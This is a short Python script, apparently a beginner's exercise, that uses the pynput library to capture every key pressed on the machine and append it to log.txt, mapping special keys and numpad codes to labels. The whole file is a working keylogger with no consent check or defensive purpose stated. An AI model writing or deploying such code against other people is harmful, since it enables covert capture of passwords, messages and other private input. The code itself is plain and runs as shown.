from pynput.keyboard import Listener

numpad_keys = {
    "<96>": "0",
    "<97>": "1",
    "<98>": "2",
    "<99>": "3",
    "<100>": "4",
    "<101>": "5",
    "<102>": "6",
    "<103>": "7",
    "<104>": "8",
    "<105>": "9",
}
def write_to_file(key):
    # print(key)
    letter = str(key)

    letter = letter.replace("'", "")
    if letter == "Key.space":
        letter = " <SPACE> "

    elif letter == "Key.enter":
        letter = " <ENTER>\n"
    elif letter == "Key.tab":
        letter = " <TAB> "
    elif letter == "Key.backspace":
        letter = " <BACKSPACE> "
    elif letter == "Key.shift":
        letter = " <SHIFT> "
    elif letter == "Key.ctrl":
        letter = " <CTRL> "
    elif letter == "Key.alt":
        letter = " <ALT> "
    elif letter == "Key.caps_lock":
        letter = " <CAPS_LOCK> "
    
    elif letter == "Key.alt_gr":
        letter = " <ALT_GR> "
    elif letter in numpad_keys:
        letter = numpad_keys[letter]
    
    

    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()


# 'with' will automatically close the listener. When we stop the program the memory allocated
# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
# or the program stops the memory is released. It's just a good coding principle to follow